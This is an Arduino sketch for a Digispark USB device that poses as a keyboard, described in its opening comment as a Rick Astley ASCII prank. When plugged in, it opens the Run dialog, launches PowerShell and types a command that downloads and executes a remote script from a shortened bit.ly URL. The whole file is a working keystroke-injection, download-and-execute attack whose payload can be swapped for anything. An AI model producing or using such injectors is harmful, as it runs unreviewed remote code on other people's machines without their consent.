//This DigiKeyboard Script turns Rick Astley to Risk ASCII and made him to dance and sing Never Let You Down inside your PowerShell screen./

#include "DigiKeyboard.h"

void setup(){
  //empity
}

void loop(){

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("iex (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;){/*empty*/}
}
